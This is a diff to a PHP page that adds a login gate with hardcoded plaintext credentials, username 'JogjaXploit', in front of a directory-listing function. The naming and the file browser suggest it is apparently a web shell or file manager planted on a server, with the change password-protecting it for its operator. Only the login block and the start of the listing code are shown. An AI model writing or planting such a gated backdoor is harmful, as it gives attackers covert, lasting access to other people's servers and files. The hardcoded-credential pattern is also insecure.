@@ -64,7 +64,33 @@
     </style>
 </head>
 <body>
+
 <?php
+session_start();
+
+$validUsername = 'JogjaXploit';
+$validPassword = 'Djaya3';
+
+if (isset($_POST['username']) && isset($_POST['password'])) {
+    if ($_POST['username'] === $validUsername && $_POST['password'] === $validPassword) {
+        $_SESSION['loggedin'] = true;
+    } else {
+        echo '<div style="color: red;">Invalid username or password.</div>';
+    }
+}
+
+if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
+    echo '<div class="container">';
+    echo '<h1>Login</h1>';
+    echo '<form method="post">';
+    echo 'Username: <input type="text" name="username"><br>';
+    echo 'Password: <input type="password" name="password"><br>';
+    echo '<input type="submit" value="Login" class="button">';
+    echo '</form>';
+    echo '</div>';
+    exit;
+}
+
 function listDirectory($dir) {
     $files = scandir($dir);
     echo '<ul>';
